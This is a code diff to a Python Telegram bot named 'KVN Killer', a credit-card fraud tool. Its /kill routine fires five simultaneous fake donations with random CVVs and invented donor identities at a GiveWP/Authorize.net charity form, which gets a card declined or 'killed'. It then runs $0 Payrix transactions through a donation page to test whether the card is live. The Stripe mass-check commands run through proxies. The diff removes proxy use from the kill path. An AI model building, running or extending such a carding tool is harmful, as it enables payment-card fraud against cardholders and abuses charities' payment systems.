@@ -1,8 +1,8 @@
 """
-KVN Killer v3.0 FINAL — Ultra Edition (Railway Ready + Proxy Fallback + SSL Fix)
-- /kill  -> Donation Gateway Killer (Authorize.net + GiveWP + Payrix)
-- /chk   -> Stripe Auth Check (Single)
-- /mst   -> Stripe Auth Mass Check (15 workers, progress UI, channel hits)
+KVN Killer v3.0 FINAL — Ultra Edition (Railway Ready + Proxy Split + SSL Fix)
+- /kill  -> Donation Gateway Killer (Authorize.net + GiveWP + Payrix) - NO PROXY
+- /chk   -> Stripe Auth Check (Single) - WITH PROXY
+- /mst   -> Stripe Auth Mass Check (15 workers, progress UI, channel hits) - WITH PROXY
 """
 
 import asyncio
@@ -416,7 +416,7 @@ def parse_cc(text: str) -> Optional[Tuple[str,str,str,str]]:
     return None
 
 # ═══════════════════════════════════════
-# MODULE 1: STRIPE AUTH CHECKER
+# MODULE 1: STRIPE AUTH CHECKER (WITH PROXY)
 # ═══════════════════════════════════════
 class StripeChecker:
     @staticmethod
@@ -457,179 +457,156 @@ class StripeChecker:
                 return {"status": "ERROR", "response": str(e), "gateway": "Stripe Auth", "amount": "0"}
 
 # ═══════════════════════════════════════
-# MODULE 2: KILLER GATEWAY
+# MODULE 2: KILLER GATEWAY (NO PROXY)
 # ═══════════════════════════════════════
 class KillerGateway:
     @staticmethod
     async def donation_attempt(card_number: str, expiration: str, donation_params: dict,
-                                attempt_num: int, proxy_url: Optional[str] = None) -> bool:
+                                attempt_num: int) -> bool:
         req_id = f"Req-{attempt_num}-{random.randint(100,999)}"
-        
-        for attempt in range(2):
-            kw = {"proxy": proxy_url} if proxy_url and attempt == 0 else {}
-            try:
-                cvv = str(random.randint(100,999))
-                amount = str(random.randint(200000, 200000))
-                fn, ln = generate_random_name()
-                phone = generate_random_phone()
-                email = generate_random_email(fn, ln)
-                a1, city, state, zc = generate_random_address()
+        try:
+            cvv = str(random.randint(100,999))
+            amount = str(random.randint(200000, 200000))
+            fn, ln = generate_random_name()
+            phone = generate_random_phone()
+            email = generate_random_email(fn, ln)
+            a1, city, state, zc = generate_random_address()
 
-                auth_payload = {
-                    "securePaymentContainerRequest": {
-                        "merchantAuthentication": {"name": SITE_CONFIG["auth_name"],
-                                                    "clientKey": SITE_CONFIG["auth_client_key"]},
-                        "data": {"type": "TOKEN", "id": SITE_CONFIG["auth_id"],
-                                 "token": {"cardNumber": card_number, "expirationDate": expiration, "cardCode": cvv}}
-                    }
+            auth_payload = {
+                "securePaymentContainerRequest": {
+                    "merchantAuthentication": {"name": SITE_CONFIG["auth_name"],
+                                                "clientKey": SITE_CONFIG["auth_client_key"]},
+                    "data": {"type": "TOKEN", "id": SITE_CONFIG["auth_id"],
+                             "token": {"cardNumber": card_number, "expirationDate": expiration, "cardCode": cvv}}
                 }
-                async with aiohttp.ClientSession() as s:
-                    async with s.post("https://api2.authorize.net/xml/v1/request.api", json=auth_payload,
-                                      headers=get_auth_headers(), timeout=aiohttp.ClientTimeout(total=30), ssl=False, **kw) as resp:
-                        auth_text = (await resp.text()).lstrip('\ufeff')
-                        auth_data = json.loads(auth_text)
+            }
+            async with aiohttp.ClientSession() as s:
+                async with s.post("https://api2.authorize.net/xml/v1/request.api", json=auth_payload,
+                                  headers=get_auth_headers(), timeout=aiohttp.ClientTimeout(total=30), ssl=False) as resp:
+                    auth_text = (await resp.text()).lstrip('\ufeff')
+                    auth_data = json.loads(auth_text)
 
-                    if auth_data.get("messages", {}).get("resultCode") != "Ok":
-                        return True
+                if auth_data.get("messages", {}).get("resultCode") != "Ok":
+                    return True
 
-                    dd = auth_data.get("opaqueData", {}).get("dataDescriptor")
-                    dv = auth_data.get("opaqueData", {}).get("dataValue")
-                    if not dd or not dv:
-                        return True
+                dd = auth_data.get("opaqueData", {}).get("dataDescriptor")
+                dv = auth_data.get("opaqueData", {}).get("dataValue")
+                if not dd or not dv:
+                    return True
 
-                    donation_payload = {
-                        'amount': amount, 'currency': 'USD', 'donationType': 'single',
-                        'formId': SITE_CONFIG["form_id"], 'gatewayId': 'authorize',
-                        'firstName': fn, 'lastName': ln, 'email': email,
-                        'anonymous': 'false', 'comment': '', 'company': 'Neend gen', 'phone': phone,
-                        'country': 'US', 'address1': a1, 'address2': '', 'city': city,
-                        'state': state, 'zip': zc, 'originUrl': SITE_CONFIG["referer_base"],
-                        'gatewayData[give_authorize_data_descriptor]': dd,
-                        'gatewayData[give_authorize_data_value]': dv
-                    }
-                    async with s.post(SITE_CONFIG["base_url"], params=donation_params, data=donation_payload,
-                                      headers=get_donation_headers(), timeout=aiohttp.ClientTimeout(total=60), ssl=False, **kw) as resp:
-                        donation_data = await resp.json()
-                        return not donation_data.get("success", False)
-            except Exception as e:
-                logger.error(f"[{req_id}] Attempt {attempt+1} error: {e}")
-                if attempt == 0 and proxy_url:
-                    continue
-                return True
-        return True
+                donation_payload = {
+                    'amount': amount, 'currency': 'USD', 'donationType': 'single',
+                    'formId': SITE_CONFIG["form_id"], 'gatewayId': 'authorize',
+                    'firstName': fn, 'lastName': ln, 'email': email,
+                    'anonymous': 'false', 'comment': '', 'company': 'Neend gen', 'phone': phone,
+                    'country': 'US', 'address1': a1, 'address2': '', 'city': city,
+                    'state': state, 'zip': zc, 'originUrl': SITE_CONFIG["referer_base"],
+                    'gatewayData[give_authorize_data_descriptor]': dd,
+                    'gatewayData[give_authorize_data_value]': dv
+                }
+                async with s.post(SITE_CONFIG["base_url"], params=donation_params, data=donation_payload,
+                                  headers=get_donation_headers(), timeout=aiohttp.ClientTimeout(total=60), ssl=False) as resp:
+                    donation_data = await resp.json()
+                    return not donation_data.get("success", False)
+        except Exception as e:
+            logger.error(f"[{req_id}] Error: {e}")
+            return True
 
     @staticmethod
-    async def payrix_check(card: str, mm: str, yy: str, cvv: str,
-                           proxy_url: Optional[str] = None) -> str:
-        for attempt in range(2):
-            kw = {"proxy": proxy_url} if proxy_url and attempt == 0 else {}
-            try:
-                gw = random.choice(PAYMENT_GATEWAYS)
-                cid, merchant = gw["cid"], gw["merchant"]
-                if cvv is None or cvv == "": cvv = str(random.randint(100,999))
+    async def payrix_check(card: str, mm: str, yy: str, cvv: str) -> str:
+        try:
+            gw = random.choice(PAYMENT_GATEWAYS)
+            cid, merchant = gw["cid"], gw["merchant"]
+            if cvv is None or cvv == "": cvv = str(random.randint(100,999))
 
-                h1 = {
+            h1 = {
+                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
+                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                'Cache-Control': "max-age=0",
+                'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
+                'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
+                'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "cross-site",
+                'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-User': "?1",
+                'Sec-Fetch-Dest': "document",
+                'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
+                'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
+            }
+            async with aiohttp.ClientSession() as s:
+                async with s.get("https://donate.givedirect.org", params={"cid": cid},
+                                 headers=h1, timeout=aiohttp.ClientTimeout(total=30), ssl=False) as resp:
+                    text = await resp.text()
+
+                soup = BeautifulSoup(text, 'html.parser')
+                el = soup.find('input', {'id': 'txnsession_key'})
+                if not el:
+                    return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗳𝗶𝗻𝗱 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
+                try:
+                    txn_key = str(el).split('value="')[1].split('"')[0]
+                except:
+                    return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
+
+                h2 = {
                     'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
-                    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                    'Cache-Control': "max-age=0",
+                    'Accept': "application/json, text/javascript, */*; q=0.01",
+                    'sec-ch-ua-platform': "\"Android\"",
                     'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
-                    'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
-                    'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "cross-site",
-                    'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-User': "?1",
-                    'Sec-Fetch-Dest': "document",
-                    'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
-                    'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
+                    'sec-ch-ua-mobile': "?1", 'x-requested-with': "XMLHttpRequest",
+                    'txnsessionkey': txn_key
                 }
-                async with aiohttp.ClientSession() as s:
-                    async with s.get("https://donate.givedirect.org", params={"cid": cid},
-                                     headers=h1, timeout=aiohttp.ClientTimeout(total=30), ssl=False, **kw) as resp:
-                        text = await resp.text()
-
-                    soup = BeautifulSoup(text, 'html.parser')
-                    el = soup.find('input', {'id': 'txnsession_key'})
-                    if not el:
-                        return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗳𝗶𝗻𝗱 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
-                    try:
-                        txn_key = str(el).split('value="')[1].split('"')[0]
-                    except:
-                        return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
-
-                    h2 = {
-                        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
-                        'Accept': "application/json, text/javascript, */*; q=0.01",
-                        'sec-ch-ua-platform': "\"Android\"",
-                        'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
-                        'sec-ch-ua-mobile': "?1", 'x-requested-with': "XMLHttpRequest",
-                        'txnsessionkey': txn_key
-                    }
-                    payload = {
-                        'origin': "1", 'merchant': merchant, 'type': "2", 'total': "0",
-                        'description': "donate live site", 'payment[number]': card,
-                        'payment[cvv]': cvv, 'expiration': f"{mm}{yy}", 'zip': "", 'last': "Tech"
-                    }
-                    async with s.post("https://api.payrix.com/txns", data=payload, headers=h2,
-                                      timeout=aiohttp.ClientTimeout(total=10), ssl=False, **kw) as resp:
-                        j = await resp.json()
-                        errors = j['response']['errors']
-                        if errors:
-                            msg = errors[0]['msg']
-                            if "No 'To' Account Specified" in msg:
-                                return "𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱\n𝗥𝗲𝗮𝘀𝗼𝗻: 𝗡𝗼𝘁 𝗳𝗼𝘂𝗻𝗱, 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿"
-                            return msg
-                        return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
-            except Exception as e:
-                logger.error(f"Payrix attempt {attempt+1} error: {e}")
-                if attempt == 0 and proxy_url:
-                    continue
-                return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱"
-        return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱"
+                payload = {
+                    'origin': "1", 'merchant': merchant, 'type': "2", 'total': "0",
+                    'description': "donate live site", 'payment[number]': card,
+                    'payment[cvv]': cvv, 'expiration': f"{mm}{yy}", 'zip': "", 'last': "Tech"
+                }
+                async with s.post("https://api.payrix.com/txns", data=payload, headers=h2,
+                                  timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
+                    j = await resp.json()
+                    errors = j['response']['errors']
+                    if errors:
+                        msg = errors[0]['msg']
+                        if "No 'To' Account Specified" in msg:
+                            return "𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱\n𝗥𝗲𝗮𝘀𝗼𝗻: 𝗡𝗼𝘁 𝗳𝗼𝘂𝗻𝗱, 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿"
+                        return msg
+                    return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+        except Exception as e:
+            logger.error(f"Payrix error: {e}")
+            return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱"
 
     @staticmethod
-    async def kill(card: str, mm: str, yy: str, cvv: str, proxy_url: Optional[str] = None) -> dict:
+    async def kill(card: str, mm: str, yy: str, cvv: str) -> dict:
         year_full = f"20{yy}" if len(yy) == 2 else yy
         expiration = f"{mm}{year_full[-2:]}"
-        
-        for attempt in range(2):
-            try:
-                form_params = {'givewp-route': "donation-form-view", 'form-id': SITE_CONFIG["form_id"]}
-                kw = {"proxy": proxy_url} if proxy_url and attempt == 0 else {}
-                async with aiohttp.ClientSession() as s:
-                    async with s.get(SITE_CONFIG["base_url"], params=form_params, headers=get_form_headers(),
-                                     timeout=aiohttp.ClientTimeout(total=30), ssl=False, **kw) as resp:
-                        sig, exp_t = extract_signatures(await resp.text()) if resp.status == 200 else (None, None)
-                        
-                if not sig or not exp_t:
-                    if attempt == 0 and proxy_url:
-                        logger.error("Kill: Form signature missing, retrying without proxy")
-                        continue
-                    return {"status": "ERROR", "response": "Form signature missing", "gateway": "Killer",
-                            "killer_status": "Error ❌"}
-
-                donation_params = {
-                    'givewp-route': "donate", 'givewp-route-signature': sig,
-                    'givewp-route-signature-id': "givewp-donate",
-                    'givewp-route-signature-expiration': exp_t
-                }
-                tasks = [KillerGateway.donation_attempt(card, expiration, donation_params, i+1, proxy_url)
-                         for i in range(5)]
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                results = [r if isinstance(r, bool) else True for r in results]
-                declined = sum(1 for r in results if r is True)
-                is_killed = (declined == 5)
-                killer_status = "KILLED ✅" if is_killed else "Maybe Live? 🤔"
-
-                payrix_result = await KillerGateway.payrix_check(card, mm, yy, cvv, proxy_url)
-                return {"status": "KILLED" if is_killed else "LIVE",
-                        "response": payrix_result, "gateway": "Killer",
-                        "killer_status": killer_status}
-            except Exception as e:
-                logger.error(f"Kill attempt {attempt+1} error: {e}")
-                if attempt == 0 and proxy_url:
-                    continue
-                return {"status": "ERROR", "response": str(e), "gateway": "Killer",
+        try:
+            form_params = {'givewp-route': "donation-form-view", 'form-id': SITE_CONFIG["form_id"]}
+            async with aiohttp.ClientSession() as s:
+                async with s.get(SITE_CONFIG["base_url"], params=form_params, headers=get_form_headers(),
+                                 timeout=aiohttp.ClientTimeout(total=30), ssl=False) as resp:
+                    sig, exp_t = extract_signatures(await resp.text()) if resp.status == 200 else (None, None)
+                    
+            if not sig or not exp_t:
+                return {"status": "ERROR", "response": "Form signature missing", "gateway": "Killer",
                         "killer_status": "Error ❌"}
-        return {"status": "ERROR", "response": "Max retries exceeded", "gateway": "Killer",
-                "killer_status": "Error ❌"}
+
+            donation_params = {
+                'givewp-route': "donate", 'givewp-route-signature': sig,
+                'givewp-route-signature-id': "givewp-donate",
+                'givewp-route-signature-expiration': exp_t
+            }
+            tasks = [KillerGateway.donation_attempt(card, expiration, donation_params, i+1)
+                     for i in range(5)]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            results = [r if isinstance(r, bool) else True for r in results]
+            declined = sum(1 for r in results if r is True)
+            is_killed = (declined == 5)
+            killer_status = "KILLED ✅" if is_killed else "Maybe Live? 🤔"
+
+            payrix_result = await KillerGateway.payrix_check(card, mm, yy, cvv)
+            return {"status": "KILLED" if is_killed else "LIVE",
+                    "response": payrix_result, "gateway": "Killer",
+                    "killer_status": killer_status}
+        except Exception as e:
+            return {"status": "ERROR", "response": str(e), "gateway": "Killer",
+                    "killer_status": "Error ❌"}
 
 # ═══════════════════════════════════════
 # UI / FORMATTERS
@@ -1192,20 +1169,18 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{box_title('⚡ KVN KILLER ⚡')}\n\n{loading_bar(10, 'Initializing Sequence...')}",
         parse_mode=ParseMode.HTML)
     start = time.time()
-    proxy = proxy_rotator.get_random()
-    purl = proxy["url"] if proxy else None
 
     await loading.edit_text(
         f"{box_title('⚡ KVN KILLER ⚡')}\n\n{loading_bar(30, 'Engaging Target...')}",
         parse_mode=ParseMode.HTML)
 
     async with aiohttp.ClientSession() as session:
-        bin_info = await bin_lookup(card, session, purl)
+        bin_info = await bin_lookup(card, session, None)
 
     await loading.edit_text(
         f"{box_title('⚡ KVN KILLER ⚡')}\n\n{loading_bar(50, 'Spamming Gateways...')}",
         parse_mode=ParseMode.HTML)
-    result = await KillerGateway.kill(card, mm, yy, cvv, purl)
+    result = await KillerGateway.kill(card, mm, yy, cvv)
 
     elapsed = round(time.time() - start, 2)
     user_db.log_check(u.id, card, result["status"], "Killer")
